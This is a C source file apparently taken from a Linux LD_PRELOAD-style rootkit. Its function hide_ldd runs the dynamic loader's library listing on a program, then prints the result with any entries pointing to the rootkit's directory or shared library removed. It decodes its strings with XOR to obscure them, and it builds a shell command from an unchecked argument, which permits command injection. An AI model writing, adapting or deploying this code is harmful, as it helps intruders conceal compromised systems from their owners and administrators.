#include "../rkconsts.h"

void hide_ldd(char **argv) {
    DEBUG_MSG("[-] hide_ldd called\n");
        
    // int i = 0;
    // while (argv[i] != NULL) {
    //     DEBUG_MSG("argv: %s\n", argv[i]);
    //     i++;
    // }
	char buf[4096];
	char cmd[8192];
	FILE *fp;
	char *p, *p2;
    
    char *hidden_str = strdup(HIDDEN_STR); xor(hidden_str);
    char *rk_home = strdup(RK_HOME); xor(rk_home);
    char *ld_linux_so = strdup(LD_LINUX_SO_PATH); xor(ld_linux_so);

    sprintf(cmd, "%s --list %s", ld_linux_so, argv[1]);
    DEBUG_MSG("[-] cmd: %s\n", cmd);

	fp = popen(cmd, "r");
	if (fread(buf, 4096, 1, fp) != 0) {
        exit(0);
    }
    DEBUG_MSG("[-] Read file successfully\n");
	p = buf;

	while ((p2=strchr(p, '\n'))) {
		*p2 = 0;
		if (strstr(p, rk_home) || strstr(p, hidden_str)) {
            DEBUG_MSG("[!] Skipping entry containing rootkit .so\n");
			p = p2+1;
			continue;
		}
 		printf("%s\n", p);
		p = p2+1;
	}

    // cleanup 
    CLEAN(hidden_str);
    CLEAN(rk_home);
    CLEAN(ld_linux_so);
	exit(0);
}